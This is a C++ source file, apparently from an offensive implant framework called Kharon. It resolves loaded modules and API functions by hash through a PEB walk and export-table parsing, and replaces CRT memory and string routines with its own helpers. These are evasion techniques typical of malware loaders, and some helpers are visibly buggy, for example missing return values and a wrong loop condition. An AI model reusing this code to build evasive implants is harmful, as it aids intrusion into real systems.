#include <Kharon.h>

using namespace Root;

auto DECLFN LdrLoad::Module(
    _In_ const ULONG LibHash
) -> UPTR {
    RangeHeadList( NtCurrentPeb()->Ldr->InLoadOrderModuleList, PLDR_DATA_TABLE_ENTRY, {
        if ( !LibHash ) {
            return reinterpret_cast<UPTR>( Entry->OriginalBase );
        }
 
        if ( Hsh::Str<WCHAR>( Entry->BaseDllName.Buffer ) == LibHash ) {
            return reinterpret_cast<UPTR>( Entry->OriginalBase );
        }
     } )
 
     return 0;
}
 
auto DECLFN LdrLoad::_Api(
    _In_ const UPTR ModBase,
    _In_ const UPTR SymbHash
) -> UPTR {
     auto FuncPtr    = UPTR { 0 };
     auto NtHdr      = PIMAGE_NT_HEADERS { nullptr };
     auto DosHdr     = PIMAGE_DOS_HEADER { nullptr };
     auto ExpDir     = PIMAGE_EXPORT_DIRECTORY { nullptr };
     auto ExpNames   = PDWORD { nullptr };
     auto ExpAddress = PDWORD { nullptr };
     auto ExpOrds    = PWORD { nullptr };
     auto SymbName   = PSTR { nullptr };
 
     DosHdr = reinterpret_cast<PIMAGE_DOS_HEADER>( ModBase );
     if ( DosHdr->e_magic != IMAGE_DOS_SIGNATURE ) {
         return 0;
     }
 
     NtHdr = reinterpret_cast<PIMAGE_NT_HEADERS>( ModBase + DosHdr->e_lfanew );
     if ( NtHdr->Signature != IMAGE_NT_SIGNATURE ) {
         return 0;
     }
 
     ExpDir     = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>( ModBase + NtHdr->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
     ExpNames   = reinterpret_cast<PDWORD>( ModBase + ExpDir->AddressOfNames );
     ExpAddress = reinterpret_cast<PDWORD>( ModBase + ExpDir->AddressOfFunctions );
     ExpOrds    = reinterpret_cast<PWORD> ( ModBase + ExpDir->AddressOfNameOrdinals );
 
     for ( int i = 0; i < ExpDir->NumberOfNames; i++ ) {
         SymbName = reinterpret_cast<PSTR>( ModBase + ExpNames[ i ] );
 
         if ( Hsh::Str( SymbName ) != SymbHash ) {
             continue;
         }
 
         FuncPtr = ModBase + ExpAddress[ ExpOrds[ i ] ];
 
         break;
     }
 
     return FuncPtr;
}

auto DECLFN Mem::Copy(
    _In_ PVOID Dst,
    _In_ PVOID Src,
    _In_ ULONG Size
) -> PVOID {
    PBYTE D = (PBYTE)Dst;
	PBYTE S = (PBYTE)Src;

	while (Size--)
		*D++ = *S++;
	return Dst;
}

auto DECLFN Mem::Set(
    _In_ UPTR Addr,
    _In_ UPTR Val,
    _In_ UPTR Size
) -> void {
    PULONG Dest = (PULONG)Addr;
	SIZE_T Count = Size / sizeof(ULONG);

	while ( Count > 0 ) {
		*Dest = Val; Dest++; Count--;
	}

	return;
}

EXTERN_C void* DECLFN memset(void* ptr, int value, size_t num) {
    Mem::Set((UPTR)ptr, value, num);
    return ptr;
}

EXTERN_C void* DECLFN memcpy(void *__restrict__ _Dst, const void *__restrict__ _Src, size_t _Size) {
    return Mem::Copy( _Dst, (PVOID)_Src, _Size );
}

auto DECLFN Mem::Zero(
    _In_ UPTR Addr,
    _In_ UPTR Size
) -> void {
    Mem::Set( Addr, 0, Size );
}

auto DECLFN Str::WCharToChar( 
    PCHAR  Dest, 
    PWCHAR Src, 
    SIZE_T MaxAllowed 
) -> SIZE_T {
    SIZE_T Length = MaxAllowed;
    while (--Length > 0) {
        if (!(*Dest++ = static_cast<CHAR>(*Src++))) {
            return MaxAllowed - Length - 1;
        }
    }
    return MaxAllowed - Length;
}

auto DECLFN Str::CharToWChar( 
    PWCHAR Dest, 
    PCHAR  Src, 
    SIZE_T MaxAllowed 
) -> SIZE_T {
    SIZE_T Length = MaxAllowed;
    while ( --Length > 0 ) {
        if ( !( *Dest++ = static_cast<WCHAR>( *Src++ ) ) ) {
            return MaxAllowed - Length - 1;
        }
    }
    return MaxAllowed - Length;
}

auto DECLFN Str::LengthA( 
    LPCSTR String 
) -> SIZE_T {
    LPCSTR End = String;
    while (*End) ++End;
    return End - String;
}

auto DECLFN Str::LengthW( 
    LPCWSTR String 
) -> SIZE_T {
    LPCWSTR End = String;
    while (*End) ++End;
    return End - String;
}

auto DECLFN Str::CompareCountA( 
    PCSTR Str1, 
    PCSTR Str2, 
    INT16 Count 
) -> INT {
    INT16 Idx = 0;

    while (*Str1 && (*Str1 == *Str2) && Idx == Count ) {
        ++Str1;
        ++Str2;

        Idx++;
    }
    return static_cast<INT>(*Str1) - static_cast<INT>(*Str2);
}

auto DECLFN Str::CompareA( 
    LPCSTR Str1, 
    LPCSTR Str2 
) -> INT {
    while (*Str1 && (*Str1 == *Str2)) {
        ++Str1;
        ++Str2;
    }
    return static_cast<INT>(*Str1) - static_cast<INT>(*Str2);
}

auto DECLFN Str::CompareW( 
    LPCWSTR Str1, 
    LPCWSTR Str2 
) -> INT {
    while ( *Str1 && ( *Str1 == *Str2 ) ) {
        ++Str1;
        ++Str2;
    }
    return static_cast<INT>( *Str1 ) - static_cast<INT>( *Str2 );
}

auto DECLFN Str::ToUpperChar(
    char* str
) -> VOID {
    while (*str) {
        if (*str >= 'a' && *str <= 'z') {
            *str = *str - ('a' - 'A');
        }
        str++;
    }
}

auto DECLFN Str::ToLowerChar( 
    PCHAR Str
) -> VOID {
    while (*Str) {
        if (*Str >= 'A' && *Str <= 'Z') {
            *Str += ('a' - 'A');
        }
        ++Str;
    }
}

auto DECLFN Str::ToLowerWchar( 
    WCHAR Ch 
) -> WCHAR {
    return (Ch >= L'A' && Ch <= L'Z') ? Ch + (L'a' - L'A') : Ch;
}

auto DECLFN Str::CopyA( 
    PCHAR  Dest, 
    LPCSTR Src 
) -> PCHAR {
    PCHAR p = Dest;
    while ((*p++ = *Src++));
    return Dest;
}

auto DECLFN Str::CopyW( 
    PWCHAR  Dest, 
    LPCWSTR Src 
) -> PWCHAR {
    PWCHAR p = Dest;
    while ( ( *p++ = *Src++ ) );
    return Dest;
}

auto DECLFN Str::ConcatA( 
    PCHAR  Dest, 
    LPCSTR Src 
) -> PCHAR {
    Str::CopyA( Dest + Str::LengthA(Dest), Src );
}

auto DECLFN Str::ConcatW( 
    PWCHAR  Dest, 
    LPCWSTR Src 
) -> PWCHAR {
    Str::CopyW( Dest + Str::LengthW(Dest), Src );
}

auto DECLFN Str::IsEqual( 
    LPCWSTR Str1, 
    LPCWSTR Str2 
) -> BOOL {
    WCHAR TempStr1[MAX_PATH], TempStr2[MAX_PATH];
    SIZE_T Length1 = Str::LengthW( Str1 );
    SIZE_T Length2 = Str::LengthW( Str2 );

    if ( Length1 >= MAX_PATH || Length2 >= MAX_PATH ) return FALSE;

    for (SIZE_T i = 0; i < Length1; ++i) {
        TempStr1[i] = Str::ToLowerWchar( Str1[i] );
    }
    TempStr1[Length1] = L'\0';

    for (SIZE_T j = 0; j < Length2; ++j) {
        TempStr2[j] = Str::ToLowerWchar( Str2[j] );
    }
    TempStr2[Length2] = L'\0';

    return Str::CompareW( TempStr1, TempStr2 ) == 0;
}

auto DECLFN Str::InitUnicode( 
    PUNICODE_STRING UnicodeString, 
    PWSTR           Buffer 
) -> VOID {
    if (Buffer) {
        SIZE_T Length = Str::LengthW(Buffer) * sizeof(WCHAR);
        if (Length > 0xFFFC) Length = 0xFFFC;

        UnicodeString->Buffer = const_cast<PWSTR>(Buffer);
        UnicodeString->Length = static_cast<USHORT>(Length);
        UnicodeString->MaximumLength = static_cast<USHORT>(Length + sizeof(WCHAR));
    } else {
        UnicodeString->Buffer = nullptr;
        UnicodeString->Length = 0;
        UnicodeString->MaximumLength = 0;
    }
}

// auto DECLFN Str::GenRnd( 
//     ULONG StringSize
// ) -> PCHAR {
//     CHAR  Words[]    = "abcdefghijklmnopqrstuvwxyz0123456789";
//     ULONG WordsLen   = Str::LengthA( Words );
//     ULONG Count      = 0;
//     PSTR  RndString  = A_PTR( Heap().Alloc( StringSize ) );

//     for ( INT i = 0; i < StringSize; i++ ) {
//         ULONG Count  = ( Random32() % WordsLen );
//         Mem::Copy( RndString, &Words[Count] , sizeof( Words[Count] ) + i );
//     }

//     return RndString;
// }

auto DECLFN Rnd32(
    VOID
) -> ULONG {
    UINT32 Seed = 0;

    _rdrand32_step( &Seed );
    
    return Seed;
}

VOID DECLFN volatile ___chkstk_ms(
    VOID
) { __asm__( "nop" ); }